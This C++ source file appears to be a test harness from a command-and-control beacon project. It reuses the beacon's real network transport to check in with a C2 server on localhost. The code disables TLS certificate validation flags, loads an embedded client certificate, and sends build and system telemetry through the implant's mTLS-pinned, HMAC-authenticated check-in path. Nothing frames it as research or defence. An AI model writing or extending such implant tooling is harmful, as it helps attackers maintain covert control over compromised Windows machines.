// Diagnostic harness: uses the REAL beacon transport (network.h + auth
// headers) to reproduce the check-in path exactly. Compiled like the beacon.
#include <windows.h>
#include <cstdio>
#include <string>
#include "build_id.h"
#include "c2_config.h"
#include "crypto.h"
#include "network.h"
#include "winhttp_dynamic.h"

int main() {
    WSADATA wsa;
    if (WSAStartup(MAKEWORD(2, 2), &wsa) != 0) { printf("WSA fail\n"); return 1; }
    net::C2Config cfg;
    cfg.beacon_id = BEACON_AUTH_ID;
    cfg.host = L"127.0.0.1";
    cfg.port = 8443;
    cfg.use_https = true;
    printf("[*] beacon_id=%s fingerprint=%.16s...\n", cfg.beacon_id.c_str(), BEACON_SERVER_FINGERPRINT);

    if (!net::g_ctx.ensure(cfg)) { printf("[!] ctx.ensure FAILED\n"); return 1; }
    printf("[+] ctx.ensure OK (session+connect)\n");

    // 1) plain TLS request WITHOUT client cert / pinning expectations
    HINTERNET hReq = winhttp_dyn::WinHttpOpenRequestDynamic(
        net::g_ctx.hConnect, L"GET", L"/", nullptr, nullptr,
        WINHTTP_DEFAULT_ACCEPT_TYPES, WINHTTP_FLAG_SECURE);
    if (!hReq) { printf("[!] OpenRequest failed GLE=%lu\n", GetLastError()); return 1; }
    DWORD secflags = 0x00000100 | 0x00000200 | 0x00002000 | 0x00000020 | 0x00000080;
    winhttp_dyn::WinHttpSetOptionDynamic(hReq, WINHTTP_OPTION_SECURITY_FLAGS,
                                              &secflags, sizeof(secflags));
    BOOL ok = winhttp_dyn::WinHttpSendRequestDynamic(hReq, nullptr, 0,
                                                          WINHTTP_NO_REQUEST_DATA, 0, 0, 0);
    if (!ok) {
        // Expected on hosts where schannel auto-picks an unusable machine
        // cert (GLE 12044) — this is the bug the fixed transport works
        // around. Keep going: the real checkin below uses the fixed path.
        printf("[!] plain TLS send FAILED GLE=%lu (expected pre-fix behaviour; continuing)\n", GetLastError());
    } else {
        ok = winhttp_dyn::WinHttpReceiveResponseDynamic(hReq, nullptr);
        DWORD status = 0, sz = sizeof(status);
        if (ok) {
            winhttp_dyn::WinHttpQueryOptionDynamic(hReq,
                WINHTTP_QUERY_FLAG_NUMBER | WINHTTP_QUERY_STATUS_CODE,
                &status, &sz);
        }
        printf("[+] plain TLS GET / -> status=%lu (server reachable)\n", status);
    }
    winhttp_dyn::WinHttpCloseHandleDynamic(hReq);

    // 2) PFX + client cert diagnostics (what the real transport does)
    {
        HCERTSTORE store = nullptr;
        PCCERT_CONTEXT cert = nullptr;
        CRYPT_DATA_BLOB blob{};
        blob.pbData = const_cast<BYTE*>(BEACON_CLIENT_PFX);
        blob.cbData = BEACON_CLIENT_PFX_LEN;
#ifndef PKCS12_NO_PERSIST_KEY
#define PKCS12_NO_PERSIST_KEY 0x00008000
#endif
        store = PFXImportCertStore(&blob, nullptr, PKCS12_NO_PERSIST_KEY);
        printf("[*] PFXImportCertStore(NO_PERSIST): %p GLE=%lu\n", (void*)store, GetLastError());
        if (!store) {
            store = PFXImportCertStore(&blob, nullptr, 0);
            printf("[*] PFXImportCertStore(PERSIST): %p GLE=%lu\n", (void*)store, GetLastError());
        }
        if (store) {
            cert = CertEnumCertificatesInStore(store, nullptr);
            printf("[*] CertEnum: %p GLE=%lu\n", (void*)cert, GetLastError());
            if (cert) {
                DWORD plen = 0;
                BOOL has = CertGetCertificateContextProperty(cert,
                    CERT_KEY_PROV_INFO_PROP_ID, nullptr, &plen);
                printf("[*] KEY_PROV_INFO present=%d plen=%lu GLE=0x%08lX\n",
                       has, plen, GetLastError());
                plen = 0;
                has = CertGetCertificateContextProperty(cert,
                    CERT_SHA1_HASH_PROP_ID, nullptr, &plen);
                printf("[*] SHA1_HASH present=%d plen=%lu GLE=0x%08lX\n",
                       has, plen, GetLastError());
                BOOL so = WinHttpSetOption(net::g_ctx.hConnect,
                    WINHTTP_OPTION_CLIENT_CERT_CONTEXT,
                    (LPVOID)cert, sizeof(*cert));
                printf("[*] SetOption(CLIENT_CERT) on CONNECT handle: %d GLE=%lu\n",
                       so, GetLastError());
            }
        }
    }

    // 3) full check-in through the real transport (mTLS + pinning + HMAC)
    std::string telemetry = "{\"build_id\":\"" BUILD_ID "\",\"sysinfo\":\"harness-test\"}";
    std::string resp = net::checkin(cfg, telemetry);
    if (resp.empty()) {
        printf("[!] full checkin returned EMPTY (mTLS/pinning/auth failure)\n");
        return 2;
    }
    printf("[+] checkin RESPONSE (%zu bytes): %.200s\n", resp.size(), resp.c_str());
    return 0;
}
